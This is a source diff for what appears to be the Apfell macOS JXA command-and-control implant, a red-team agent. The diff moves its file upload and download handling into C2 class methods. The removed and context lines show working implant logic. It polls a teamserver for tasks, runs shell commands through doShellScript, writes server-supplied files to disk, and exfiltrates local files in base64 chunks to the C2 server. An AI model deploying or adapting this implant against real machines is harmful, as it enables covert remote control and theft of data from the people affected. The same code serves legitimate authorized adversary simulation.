@@ -49,11 +49,17 @@ class baseC2{
 	getConfig(){
 		//gets the current configuration for tasking
 	}
-	postResponse(){
+	postResponse(task, output){
 		//output a response to a task
 	}
-	setConfig(){
+	setConfig(params){
 		//updates the current configuration for how to get tasking
+	}
+	download(task, params){
+	    //gets a file from the apfell server in some way
+	}
+	upload(task, params){
+	    //uploads a file in some way to the teamserver
 	}
 }
 //------------- C2Profile -------------------------------------------
@@ -66,6 +72,7 @@ for(var i=0; i < apfell.ip.length; i++){
 		break;
 	}
 }
+//-------------COMMAND DECLARATIONS -----------------------
 shell = function(command){
 	//simply run a shell command via doShellScript and return the response
 	try{
@@ -351,7 +358,7 @@ write_data_to_file = function(data, file_path){
         }
      }
      catch(error){
-        return "failed to write to file";
+        return "failed to write to file: " + error.toString();
      }
 }
 sleepWakeUp = function(t){
@@ -502,56 +509,10 @@ sleepWakeUp = function(t){
 				$.NSApplication.sharedApplication.terminate(this);
 			}
 			else if(command == "upload"){
-                var split_params = params.split(" ");
-                var url = "api/v1.0/files/" + split_params[0];
-                var file_data = C2.htmlGetData(C2.baseurl + url);
-                var file_path = split_params.slice(1, ).join(" ");
-                var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
-                var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
-                output = write_data_to_file(decoded_data, file_path);
-
+			    output = C2.upload(task, params);
 			}
 			else if(command == "download"){
-                // download just has one parameter of the path of the file to download
-                if( does_file_exist(params)){
-                    var offset = 0;
-                    var chunkSize = 512000; //3500;
-                    var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
-                    // Get the file size by seeking;
-                    var fileSize = handle.seekToEndOfFile;
-                    // always round up to account for chunks that are < chunksize;
-                    var numOfChunks = Math.ceil(fileSize / chunkSize);
-                    var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
-                    registerData = convert_to_nsdata(registerData);
-                    registerFile = C2.postResponse("api/v1.0/responses/" + task.id, registerData);
-                    if (registerFile['status'] == "success"){
-                        handle.seekToFileOffset(0);
-                        var currentChunk = 1;
-                        var data = handle.readDataOfLength(chunkSize);
-                        while(parseInt(data.length) > 0 && offset < fileSize){
-                            // send a chunk
-                            var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['id']});
-                            fileData = convert_to_nsdata(fileData);
-                            C2.postResponse("api/v1.0/responses/" + task.id, fileData);
-                            $.NSThread.sleepForTimeInterval(C2.interval);
-
-                            // increment the offset and seek to the amount of data read from the file
-                            offset += parseInt(data.length);
-                            handle.seekToFileOffset(offset);
-                            currentChunk += 1;
-                            data = handle.readDataOfLength(chunkSize);
-                        }
-                        output = "Finished downloading file with id: " + registerFile['id'];
-                        output += "\nBrowse to /api/v1.0/files/" + registerFile['id'];
-                    }
-                    else{
-                        output = "Failed to register file to download";
-                    }
-                }
-                else{
-                    output = "file does not exist";
-                }
-
+                output = C2.download(task, params);
 			}
 			else if(command == "sleep") {
 				// Update agent sleep
@@ -567,7 +528,8 @@ sleepWakeUp = function(t){
 			if ((typeof output) == "string"){
 			    output = convert_to_nsdata(output);
 			}
-			C2.postResponse("api/v1.0/responses/" + task.id, output);
+			C2.postResponse(task, output);
+			//C2.postResponse("api/v1.0/responses/" + task.id, output);
 		}
 	}
 	catch(error){
@@ -578,4 +540,5 @@ sleepWakeUp = function(t){
 //https://stackoverflow.com/questions/37834749/settimout-with-javascript-for-automation
 timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
 $.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
+//TODO update this to not be $.NSDate.distantFuture but rather should be the C2.killdate
 $.NSRunLoop.currentRunLoop.runModeBeforeDate("timer", $.NSDate.distantFuture);
